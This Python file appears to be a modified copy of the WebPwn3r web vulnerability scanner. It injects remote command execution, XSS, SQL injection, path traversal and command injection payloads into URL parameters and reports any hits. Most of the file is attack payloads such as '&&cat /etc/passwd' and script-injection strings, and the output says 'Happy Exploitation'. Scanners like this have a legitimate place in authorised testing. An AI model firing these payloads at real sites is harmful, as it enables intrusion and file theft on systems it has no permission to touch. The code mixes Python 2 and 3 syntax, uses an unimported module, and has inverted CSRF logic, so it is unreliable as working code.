#!/usr/bin/env python
# WebPwn3r is a Web Applications Security Scanner
# By Ebrahim Hegazy - twitter.com/Rarken
# First demo conducted 12Apr-2014 @OWASP Chapter Egypt
# https://www.owasp.org/index.php/Cairo
import urllib
import requests
import re
from headers import *

#updates:
# 1- Fixed the empty parameters issue => Done.
# 2- User agents when sending a Request => Done.
# 3- Added Error Based SQLI Detection Support => Done.
# 4- Will try to add XSS Injection in Cookies, Refere and UserAgent

def main_function(url, payloads, check):
        #This function is going to split the url and try the append paylods in every parameter value.
        opener = urllib.urlopen(url)
	vuln = 0
        if opener.code == 999:
                # Detetcing the WebKnight WAF from the StatusCode.
                print ga.red +" [~] WebKnight WAF Detected!"+ga.end
                print ga.red +" [~] Delaying 3 seconds between every request"+ga.end
                time.sleep(3)
        for params in url.split("?")[1].split("&"):
            #sp = params.split("=")[0]
            for payload in payloads:
                #bugs = url.replace(sp, str(payload).strip())
                bugs = url.replace(params, params + str(payload).strip())
		#print bugs
		#exit()
                request = useragent.open(bugs)
		html = request.readlines()
                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) !=0:
                        print ga.red+" [*] Payload Found . . ."+ga.end
                        print ga.red+" [*] Payload: " ,payload +ga.end
                        print ga.green+" [!] Code Snippet: " +ga.end + line.strip()
                        print ga.blue+" [*] POC: "+ga.end + bugs
                        print ga.green+" [*] Happy Exploitation :D"+ga.end
                        vuln +=1
        if vuln == 0:                
        	print ga.green+" [!] Target is not vulnerable!"+ga.end
        else:
        	print ga.blue+" [!] Congratulations you've found %i bugs :-) " % (vuln) +ga.end

# Here stands the vulnerabilities functions and detection payloads. 
def rce_func(url):
    headers_reader(url)
    print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
    print(ga.blue + " [!] Covering Linux & Windows Operating Systems " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        ';${@print(md5(Rarken))}', ';${@print(md5("Rarken"))}', 
        ';$(echo Rarken)', '&&echo Rarken', ';phpinfo();', ';system("ls");',
        '&&dir', '&&type C:\\boot.ini', '&&ls', '&&cat /etc/passwd'
    ]
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522Rarken%2522%2529%2529%257D%253B']
    check = re.compile(r"51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function(url, payloads, check)
    
def xss_func(url):
    print(ga.bold + "\n [!] Now Scanning for XSS " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        '%27%3ERarken%3Csvg%2Fonload%3Dconfirm%28%2FRarken%2F%29%3Eweb',
        '%78%22%78%3e%78', '%22%3ERarken%3Csvg%2Fonload%3Dconfirm%28%2FRarken%2F%29%3Eweb',
        'Rarken%3Csvg%2Fonload%3Dconfirm%28%2FRarken%2F%29%3Eweb',
        '<script>alert("Rarken")</script>', '<img src="x" onerror="alert(\'Rarken\')">',
        '"><script>alert(1)</script>', '"><img src=x onerror=alert(1)>'
    ]
    check = re.compile(r'Rarken<svg|x>x|<script>alert|<img src=x onerror', re.I)
    main_function(url, payloads, check)

def error_based_sqli_func(url):
    print(ga.bold + "\n [!] Now Scanning for Error Based SQL Injection " + ga.end)
    print(ga.blue + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        "3'", "3%5c", "3%27%22%28%29", "3'><", 
        "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27",
        "1' OR '1'='1", "1' OR '1'='1' --", "1' OR 1=1 --", "' OR ''='",
        "1' OR '1'='1'/*", "' OR '1'='1' --", "' OR 1=1--", "1' OR '1'='1' -- "
    ]
    check = re.compile(r"Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)
    
def lfi_func(url):
    print(ga.bold + "\n [!] Now Scanning for Local File Inclusion " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        '../../../../etc/passwd', '../../../../../windows/win.ini',
        '../../../../../../../../etc/passwd', '../../../../../../../../windows/win.ini',
        '../../etc/passwd', '../windows/win.ini', '/etc/passwd', '/windows/win.ini'
    ]
    check = re.compile(r"root:|[boot loader]|[extensions]", re.I)
    main_function(url, payloads, check)
    
def directory_traversal_func(url):
    print(ga.bold + "\n [!] Now Scanning for Directory Traversal Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        '../../../../../../../../../../../../../../../../etc/passwd',
        '../../../../../../../../../../../../../../../../windows/win.ini',
        '../../../../etc/passwd', '../../../../windows/win.ini',
        '../../../etc/passwd', '../../../windows/win.ini',
        '../../etc/passwd', '../../windows/win.ini',
        '../etc/passwd', '../windows/win.ini',
        '/etc/passwd', '/windows/win.ini'
    ]
    check = re.compile(r"root:|[boot loader]|[extensions]", re.I)
    main_function(url, payloads, check)
    
def command_injection_func(url):
    print(ga.bold + "\n [!] Now Scanning for Command Injection Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        '|cat /etc/passwd', ';cat /etc/passwd', '&&cat /etc/passwd',
        '|type C:\\boot.ini', ';type C:\\boot.ini', '&&type C:\\boot.ini'
    ]
    check = re.compile(r"root:|[boot loader]|[extensions]", re.I)
    main_function(url, payloads, check)
    
def csrf_func(url):
    print(ga.bold + "\n [!] Now Scanning for CSRF Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    payloads = [
        '<img src="http://evil.com/transfer-funds">',
        '<form action="http://evil.com/transfer-funds"><input type="submit">',
        '<iframe src="http://evil.com/transfer-funds"></iframe>'
    ]
    check = re.compile(r"csrf_token|csrfmiddlewaretoken|CSRFToken", re.I)
    main_function(url, payloads, check)
    
def subdomain_scan_func(url):
    print(ga.bold + "\n [!] Now Scanning for Subdomains " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    # Extracting the base domain from the URL
    base_domain = url.split("//")[-1].split("/")[0]

    # Payloads for subdomain enumeration
    subdomain_payloads = [
        "www", "mail", "admin", "blog", "shop", "store", "support", "forum",
        "dev", "test", "ftp", "irc", "news", "dns", "vpn", "api"
    ]

    subdomains = []
    for subdomain in subdomain_payloads:
        test_subdomain = f"{subdomain}.{base_domain}"
        try:
            response = requests.get(f"http://{test_subdomain}", timeout=5)
            if response.status_code < 400:
                subdomains.append(test_subdomain)
        except requests.exceptions.RequestException:
            pass

    if subdomains:
        print(ga.red + f" [*] Subdomains found: {', '.join(subdomains)}" + ga.end)
    else:
        print(ga.green + " [!] No subdomains found." + ga.end)
        
def data_breach_scan_func(url):
    print(ga.bold + "\n [!] Now Scanning for Data Breaches " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    # Payloads for data breach scan
    sensitive_keywords = ["password", "username", "credit card", "social security", "SSN", "email", "personal information"]

    for keyword in sensitive_keywords:
        try:
            response = requests.get(url, timeout=5)
            if keyword.lower() in response.text.lower():
                print(ga.red + f" [*] Potential data breach found: '{keyword}' detected on the page." + ga.end)
        except requests.exceptions.RequestException:
            pass

    print(ga.green + " [!] Data breach scan completed." + ga.end)
    
def api_scan_func(url):
    print(ga.bold + "\n [!] Now Scanning for API Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    # Payloads for API scan
    api_endpoints = [
        "/api", "/api/v1", "/api/v2", "/v1/api", "/v2/api", "/services", "/services/api",
        "/services/v1", "/services/v2", "/rest", "/rest/api", "/rest/v1", "/rest/v2",
        "/json", "/json/api", "/json/v1", "/json/v2"
    ]

    vulnerabilities_found = False

    for endpoint in api_endpoints:
        api_url = url.rstrip('/') + endpoint
        try:
            response = requests.get(api_url, timeout=5)
            if response.status_code == 200:
                print(ga.red + f" [*] Potential API endpoint found: {api_url}" + ga.end)
                vulnerabilities_found = True
        except requests.exceptions.RequestException:
            pass

    if not vulnerabilities_found:
        print(ga.green + " [!] No potential API endpoints found." + ga.end)
        
def cdn_scan_func(url):
    print(ga.bold + "\n [!] Now Scanning for CDN Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    # Common CDN endpoint prefixes
    cdn_endpoints = [
        "cdn", "static", "assets", "images", "js", "css", "scripts", "styles", "files", "cdn-cgi", "ajax"
    ]

    vulnerabilities_found = False

    for endpoint in cdn_endpoints:
        cdn_url = f"https://{endpoint}.{url}"
        try:
            response = requests.get(cdn_url, timeout=5)
            if response.status_code == 200:
                print(ga.red + f" [*] Potential CDN endpoint found: {cdn_url}" + ga.end)
                vulnerabilities_found = True
        except requests.exceptions.RequestException:
            pass

    if not vulnerabilities_found:
        print(ga.green + " [!] No potential CDN endpoints found." + ga.end)

def url_structure_scan_func(url):
    print(ga.bold + "\n [!] Now Scanning URL Structure for Vulnerabilities " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)

    # Payloads for URL structure scan
    url_structure_payloads = [
        "../", "../../", "../../../", "../../../../",
        "?id=", "?path=", "?file=", "?resource="
    ]

    vulnerabilities_found = False

    for payload in url_structure_payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                print(ga.red + f" [*] Potential vulnerability found: {test_url}" + ga.end)
                vulnerabilities_found = True
        except requests.exceptions.RequestException:
            pass

    if not vulnerabilities_found:
        print(ga.green + " [!] No potential vulnerabilities found in URL structure." + ga.end)
        